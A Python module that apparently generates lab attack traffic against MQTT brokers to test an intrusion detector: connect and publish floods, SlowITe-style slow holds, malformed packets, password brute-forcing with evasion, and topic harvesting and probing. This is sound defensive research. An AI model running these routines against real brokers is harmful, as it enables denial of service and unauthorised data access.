"""Scripted attack families T1-T7 for the isolated lab only. Each takes (source, stop_at, broker, credentials, rng, **options)."""
import random
import time

from . import wire
from .safety import check_caps


def _pace(started, sent, rate):
    delay = started + sent / rate - time.monotonic()
    if delay > 0:
        time.sleep(delay)


def connect_flood(source, stop_at, broker, cred, rng, rate=100):
    """T1: many short authenticated connections."""
    check_caps(rate=rate)
    started, n = time.monotonic(), 0
    while time.monotonic() < stop_at:
        try:
            c = wire.Client(source, broker)
            c.login(f"cf{n}", *cred)
            c.close(graceful=rng.random() < 0.5)
        except OSError:
            pass
        n += 1
        _pace(started, n, rate)


def publish_flood(source, stop_at, broker, cred, rng, rate=2000, size=64, fixed_topic=False):
    """T2: one connection publishing as fast as the cap allows."""
    check_caps(rate=rate)
    c = wire.Client(source, broker)
    c.login("pf", *cred)
    started, n = time.monotonic(), 0
    payload = bytes(size)
    while time.monotonic() < stop_at:
        burst = b"".join(wire.publish("flood/0" if fixed_topic else f"flood/{(n + i) % 32}", payload) for i in range(50))
        c.send(burst)
        n += 50
        _pace(started, n, rate)
    c.close()


def slow_hold(source, stop_at, broker, cred, rng, connections=120, ramp_per_s=15, keepalive=65535):
    """T3: SlowITe-style. Opens connections declaring the largest keep-alive and holds them quietly."""
    check_caps(connections=connections, rate=ramp_per_s)
    held = []
    next_open = time.monotonic()
    while time.monotonic() < stop_at:
        if len(held) < connections and time.monotonic() >= next_open:
            try:
                c = wire.Client(source, broker)
                c.login(f"sl{len(held)}", *cred, keepalive=keepalive)
                held.append(c)
            except OSError:
                pass
            next_open += 1 / ramp_per_s
        time.sleep(0.01)
    for c in held:
        c.close(graceful=False)


MALFORMED = (
    wire.packet(0xf0),  # reserved type
    wire.packet(0x36, b"\0\1a"),  # PUBLISH with QoS 3
    wire.packet(0x30, b"\xff\xffa"),  # topic length past the message
    wire.packet(0x80, b"\0\1\0\1a\0"),  # SUBSCRIBE with wrong flags
    wire.packet(0x82, b"\0\1\xff\xffa\0"),  # filter length past the message
)


def malformed(source, stop_at, broker, cred, rng, rate=20):
    """T4: valid login, then a broken packet, which the broker answers by closing."""
    check_caps(rate=rate)
    started, n = time.monotonic(), 0
    while time.monotonic() < stop_at:
        try:
            c = wire.Client(source, broker, timeout=1.0)
            c.login(f"mf{n}", *cred)
            c.send(rng.choice(MALFORMED))
            c.close(graceful=False)
        except OSError:
            pass
        n += 1
        _pace(started, n, rate)


def bruteforce(source, stop_at, broker, cred, rng, rate=30, valid_every=0):
    """T5: CONNECT with invented wrong passwords; the lab broker refuses them."""
    check_caps(rate=rate)
    started, n = time.monotonic(), 0
    while time.monotonic() < stop_at:
        try:
            c = wire.Client(source, broker, timeout=1.0)
            # valid_every mixes in correct logins, which lowers the refused ratio F11; only for measuring evasion.
            c.login(f"bf{n}", cred[0], cred[1] if valid_every and n % valid_every else f"wrong-{rng.randrange(10 ** 9)}")
            c.close(graceful=False)
        except OSError:
            pass
        n += 1
        _pace(started, n, rate)


def wildcard(source, stop_at, broker, cred, rng, rate=2):
    """T6: subscribes to wildcards and harvests. Rule indicator only; there is no training data for it."""
    check_caps(rate=rate)
    c = wire.Client(source, broker)
    c.login("wc", *cred)
    n = 0
    while time.monotonic() < stop_at:
        c.send(wire.subscribe(rng.choice(("#", "+/+", "sensor/#")), packet_id=n % 65535 + 1))
        n += 1
        time.sleep(1 / rate)
    c.close()


def topic_probe(source, stop_at, broker, cred, rng, rate=10):
    """T7: enumerates concrete topic names one SUBSCRIBE at a time, including $SYS. Untrained, like T6; measures what F13/F19 show."""
    check_caps(rate=rate)
    c = wire.Client(source, broker)
    c.login("tp", *cred)
    started, n = time.monotonic(), 0
    prefixes = ("$SYS/broker", "home", "sensor", "device", "admin", "config", "cmd")
    while time.monotonic() < stop_at:
        c.send(wire.subscribe(f"{rng.choice(prefixes)}/{rng.randrange(10 ** 6)}", packet_id=n % 65535 + 1))
        n += 1
        _pace(started, n, rate)
    c.close()


FAMILIES = {"flood_connect": connect_flood, "flood_publish": publish_flood, "lowrate": slow_hold, "malformed": malformed,
            "bruteforce": bruteforce, "wildcard": wildcard, "topic_probe": topic_probe}


def run_family(family, source, seconds, broker, cred, seed=0, **options):
    FAMILIES[family](source, time.monotonic() + seconds, broker, cred, random.Random(seed), **options)
